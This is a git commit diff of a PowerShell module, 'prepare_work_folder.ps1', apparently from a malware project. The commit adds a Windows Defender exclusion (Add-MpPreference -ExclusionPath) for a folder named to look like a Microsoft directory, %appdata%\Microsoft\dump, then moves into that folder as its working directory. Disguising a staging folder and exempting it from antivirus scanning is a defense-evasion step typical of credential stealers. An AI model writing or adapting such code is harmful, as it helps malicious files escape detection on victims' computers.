6c1e52b3d9be0d5117537bf84831705332e00be6
jfkd02ks <jfkd02ks@outlook.com>
2022-10-29 23:01:57 +0300

    Added

--- modules/prepare_work_folder.ps1
+++ modules/prepare_work_folder.ps1
@@ -1,5 +1,4 @@
-#Adding windows defender exclusionpath
-Add-MpPreference -ExclusionPath "$env:appdata"
-#Creating the directory we will work on
 mkdir "$env:appdata\Microsoft\dump"
+#Adding windows defender exclusionpath
+Add-MpPreference -ExclusionPath "$env:appdata\Microsoft\dump"
 Set-Location "$env:appdata\Microsoft\dump"
